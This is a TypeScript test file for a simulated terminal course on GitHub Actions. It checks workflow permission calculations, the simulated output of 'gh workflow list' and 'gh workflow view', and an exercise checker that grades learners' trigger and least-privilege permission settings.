    expect(permissionLines(effectivePermissions(undefined, undefined, 'read'))).toEqual(['Contents: read', 'Metadata: read', 'Packages: read']);
    expect(permissionLines(effectivePermissions({ 'pull-requests': 'write', 'id-token': 'write' }, undefined, 'read'))).toEqual(['IdToken: write', 'Metadata: read', 'PullRequests: write']);
    const w = ok(CI_YML.replace('jobs:', 'jobs:\n  deploy:\n    runs-on: x\n    permissions: { contents: write, deployments: write }\n    steps: [{run: x}]'));
    expect(w.jobs.map(j => grantedScopes(effectivePermissions(w.permissions, j.permissions, 'write')))).toEqual([['contents: write', 'deployments: write'], ['contents: read']]);
  });
});

describe('gh workflow list and view', () => {
  it('lists the workflow files of the default branch with stable IDs', () => {
    expect(lab('cd shop', 'gh workflow list').last).toMatchObject({ status: 0, out: ['NAME     STATE   ID', `CI       active  ${ID.ci}`, `Release  active  ${ID.release}`] });
    expect(lab('cd shop', 'gh workflow list -L 1').last.out).toEqual(['NAME  STATE   ID', `CI    active  ${ID.ci}`]);
    expect(lab('gh workflow list -R island/tools').last.out).toEqual(['NAME  STATE   ID', `Lint  active  ${ID.lint}`]);
    expect(lab('gh workflow list').last).toMatchObject({ status: 1, err: ['failed to run git: fatal: not a git repository (or any of the parent directories): .git'] });
    expect(lab('cd tools', 'git rm -q .github/workflows/lint.yml', "git commit -qm 'No lint'", 'git push -q', 'gh workflow list').last).toMatchObject({ status: 0, out: [], err: ['no workflows found'] });
    const added = lab('cd tools', 'mkdir -p .github/workflows', "printf 'on: push\\njobs:\\n  a:\\n    runs-on: x\\n    steps: [{run: x}]\\n' > .github/workflows/new.yaml", 'git add .', "git commit -qm 'Add'", 'git push -q', 'gh workflow list');
    expect(added.last.out).toEqual(['NAME                        STATE   ID', `Lint                        active  ${ID.lint}`, expect.stringMatching(/^\.github\/workflows\/new\.yaml  active  \d{9}$/)]);
    expect(lab('cd shop', 'gh workflow list --all --limit 0').last).toMatchObject({ status: 1, err: ['invalid limit: 0'] });
  });
  it('views a workflow by name, file or ID; --yaml prints the file; an invalid file shows GitHub’s lines', () => {
    const tail = ['Total runs 0', '', 'To see more runs for this workflow, try: gh run list --workflow release.yml', 'To see the YAML for this workflow, try: gh workflow view release.yml --yaml'];
    for (const arg of ['Release', 'release', 'release.yml', '.github/workflows/release.yml', String(ID.release)]) expect(lab('cd shop', `gh workflow view ${arg}`).last.out, arg).toEqual(['Release - release.yml', `ID: ${ID.release}`, '', ...tail]);
    expect(lab('cd shop', 'gh workflow view ci.yml --yaml').last.out).toEqual(['CI - ci.yml', `ID: ${ID.ci}`, '', ...CI_YML.replace(/\n$/, '').split('\n')]);
    expect(lab('cd shop', 'gh workflow view ci.yml --ref broken').last.out).toEqual(['.github/workflows/ci.yml - ci.yml', `ID: ${ID.ci}`, '', 'Invalid workflow file: .github/workflows/ci.yml#L13',
      "The workflow is not valid. .github/workflows/ci.yml (Line: 13, Col: 5): Unexpected value 'stepz'", '', 'Total runs 0', '', 'To see more runs for this workflow, try: gh run list --workflow ci.yml', 'To see the YAML for this workflow, try: gh workflow view ci.yml --yaml']);
    const err = (...c: string[]) => lab('cd shop', ...c).last;
    expect(err('gh workflow view nope')).toMatchObject({ status: 1, err: ['could not find any workflows named nope'] });
    expect(err('gh workflow view')).toMatchObject({ status: 1, err: ['workflow argument required when not running interactively'] });
    expect(err('gh workflow view CI --web')).toMatchObject({ status: 1, err: ['gh workflow view --web：模擬環境沒有瀏覽器'] });
    expect(err('gh workflow view CI --ref nope').err[0]).toBe('HTTP 404: Not Found (https://github.example/api/v3/repos/island/shop/contents?ref=nope)');
    expect(err('gh workflow view CI --bad')).toMatchObject({ status: 1, err: ['unknown flag: --bad', '', 'Usage:  gh workflow view [<workflow-id> | <workflow-name> | <filename>] [flags]'] });
    expect(err('gh workflow run ci.yml').err[0]).toMatch(/^gh workflow run：模擬環境還不支援（Actions 的執行在 E28）/);
    expect(err('gh workflow nope')).toMatchObject({ status: 1, err: ['unknown command "nope" for "gh workflow"'] });
  });
});

describe('the workflow check', () => {
  const msgs = (ex: typeof leastExercise, k: number) => checkTerminalExercise(ex, [workflowLab], ex.mistakes[k].commands).results.filter(r => !r.ok).map(r => r.message.replace(/^.*，但/, ''));
  it('passes the reference solutions and fails the typical mistakes', () => {
    for (const ex of workflowContent.exercises) {
      expect(checkTerminalExercise(ex, [workflowLab], ex.solution).ok, ex.id).toBe(true);
      ex.mistakes.forEach((m, k) => expect(checkTerminalExercise(ex, [workflowLab], m.commands).ok, `${ex.id} ${k}`).toBe(false));
    }
    expect(msgs(leastExercise, 0)[0]).toMatch(/^job lint 的 GITHUB_TOKEN 權限是 actions: write、attestations: write、checks: write、contents: write、/);
    expect(msgs(leastExercise, 1)[0]).toMatch(/^job lint 的 GITHUB_TOKEN 權限是 actions: read、/);
    expect(msgs(triggerExercise, 0)).toEqual(['推送或開 Pull Request 到 release/1.0（改了 docs/guide.md）時觸發的是 push']);
    expect(msgs(triggerExercise, 1)).toEqual(['推送或開 Pull Request 到 release/1.0（改了 app.py）時觸發的是 （沒有事件）']);
  });
  it('describes the check and reports failures', () => {
    const fail = (c: TerminalCheck, cmds: string[] = []) => { const r = checkTerminalExercise({ ...triggerExercise, checks: [c], solution: cmds, mistakes: [] }, [workflowLab], cmds).results[0]; return { ...r, message: r.message.replace(/^.*，但/, '') }; };
    const wf = { kind: 'workflow', repo: SHOP, path: '.github/workflows/ci.yml' } as const;
    expect(fail({ ...wf, ref: 'broken' })).toMatchObject({ ok: false, message: ".github/workflows/ci.yml 不是有效的 workflow：The workflow is not valid. .github/workflows/ci.yml (Line: 13, Col: 5): Unexpected value 'stepz'" });
    expect(fail({ ...wf, ref: 'broken', valid: false })).toMatchObject({ ok: true, message: `${SHOP} 的 .github/workflows/ci.yml（broken）應該是無效的 workflow` });
    expect(fail({ ...wf, ref: 'broken', error: "Unexpected value 'stepz'" })).toMatchObject({ ok: true });
    expect(fail({ ...wf, ref: 'broken', error: 'runs-on' })).toMatchObject({ ok: false, message: "GitHub 的訊息是「The workflow is not valid. .github/workflows/ci.yml (Line: 13, Col: 5): Unexpected value 'stepz'」" });
    expect(fail({ ...wf, valid: false })).toMatchObject({ ok: false, message: '.github/workflows/ci.yml 是有效的 workflow' });
    expect(fail({ ...wf, on: ['push', 'pull_request'] })).toMatchObject({ ok: true, message: `${SHOP} 的 .github/workflows/ci.yml 應該是有效的 workflow（觸發事件是 push、pull_request）` });
    expect(fail({ ...wf, on: ['push'] })).toMatchObject({ ok: false, message: '.github/workflows/ci.yml 的觸發事件是 push、pull_request' });
    expect(fail({ ...wf, on: { ref: 'main', paths: ['app.py'], events: ['push', 'pull_request'] } })).toMatchObject({ ok: true });
    expect(fail({ ...wf, path: '.github/workflows/release.yml', on: { ref: 'refs/tags/v2', events: ['push', 'workflow_dispatch'] } })).toMatchObject({ ok: true });
    expect(fail({ ...wf, path: '.github/workflows/release.yml', job: 'publish', permissions: { contents: 'write' } })).toMatchObject({ ok: true, message: `${SHOP} 的 .github/workflows/release.yml 應該是有效的 workflow（job publish 的 GITHUB_TOKEN 權限只有 contents: write）` });
    expect(fail({ ...wf, job: 'test', permissions: { contents: 'write' } })).toMatchObject({ ok: false, message: 'job test 的 GITHUB_TOKEN 權限是 contents: read' });
    expect(fail({ ...wf, job: 'deploy' })).toMatchObject({ ok: false, message: '.github/workflows/ci.yml 沒有 job deploy' });
    expect(fail({ ...wf, path: '.github/workflows/nope.yml' })).toMatchObject({ ok: false, message: `${SHOP} 的 main 沒有 .github/workflows/nope.yml` });
    expect(fail({ ...wf, ref: 'nope' })).toMatchObject({ ok: false, message: `${SHOP} 沒有 nope` });
    expect(fail({ ...wf, repo: '/home/learner' })).toMatchObject({ ok: false, message: '/home/learner 不是 Git 儲存庫' });
    expect(fail({ ...wf, repo: '/home/learner/shop', ref: 'origin/broken', valid: false })).toMatchObject({ ok: true });
    expect(fail({ ...wf, repo: '/home/learner/tools', path: '.github/workflows/lint.yml', job: 'lint', permissions: {} })).toMatchObject({ ok: false, message: expect.stringMatching(/^job lint 的 GITHUB_TOKEN 權限是 actions: write、/) });
  });
  it('validates check data', () => {
    const problems = (c: TerminalCheck) => terminalContentProblems({ ...workflowContent, exercises: [{ ...triggerExercise, checks: [c] }] });
    const wf = { kind: 'workflow', repo: SHOP, path: '.github/workflows/ci.yml' } as const;
    expect(problems({ ...wf, path: 'ci.yml' })).toContain('exercise trigger: a workflow check needs a path like .github/workflows/ci.yml');
    expect(problems({ ...wf, repo: 'shop' })).toContain('exercise trigger: a workflow check needs a workflows machine (engine stage E27) and a repo (an absolute path or https://github.example/<owner>/<repo>.git)');
    expect(problems({ ...wf, error: '(' })).toContain('exercise trigger: a workflow check\'s error must be a regular expression');
    expect(problems({ ...wf, error: 'x', valid: true })).toContain('exercise trigger: a workflow check with error expects an invalid workflow (not valid: true)');
    expect(problems({ ...wf, valid: false, job: 'test' })).toContain('exercise trigger: a workflow check\'s on, job and permissions need a valid workflow');
    expect(problems({ ...wf, on: ['pushh'] })).toContain('exercise trigger: a workflow check\'s on lists GitHub event names');
    expect(problems({ ...wf, on: { ref: 'main', events: ['release'] } })).toContain('exercise trigger: a workflow check\'s on scenario needs a ref, relative paths and events among push, pull_request, pull_request_target, workflow_dispatch, schedule');
    expect(problems({ ...wf, permissions: { contents: 'read' } })).toContain('exercise trigger: a workflow check\'s permissions need a job and map scopes to read or write');
    expect(problems({ ...wf, job: 'test', permissions: { contents: 'none' as 'read' } })).toContain('exercise trigger: a workflow check\'s permissions need a job and map scopes to read or write');
  });
  it('validates the lesson data', () => {
    const bad = machineProblems({ ...workflowLab, forge: { login: 'mei-lin', repos: [{ url: TOOLS, workflowPermissions: 'all' as 'read' }] } });
    expect(bad).toContain(`machine dev-04: forge repo ${TOOLS}: workflowPermissions must be read or write`);
  });
  it('a variant changes the reference output; replays are deterministic and never change the given state', () => {
    const v = variantMachine(workflowLab, brokenExercise.variants![0]);
    const a = replay(v, brokenExercise.solution).steps.at(-1)!.output, b = replay(workflowLab, brokenExercise.solution).steps.at(-1)!.output;
    expect(a).not.toBe(b);
    expect(a).toContain('(Line: 12, Col: 5): Unexpected value \'run-on\'');
    const start = machineState(workflowLab), before = JSON.stringify([...start.git!.forge.map(f => [...f.refs])]);
    const cmds = ['cd tools', `printf 'x' > .github/workflows/lint.yml`, "git commit -qam x", 'git push -q', 'gh workflow view lint.yml'];
    const one = session(start, WORKFLOWS_PROFILE, ...cmds), two = session(start, WORKFLOWS_PROFILE, ...cmds);
    expect(one.log).toEqual(two.log);
    expect(JSON.stringify([...start.git!.forge.map(f => [...f.refs])])).toBe(before);
    expect(one.last.out).toContain('Invalid workflow file: .github/workflows/lint.yml#L1');
    expect(one.last.out).toContain('You have an error in your yaml syntax on line 1');
  });
});
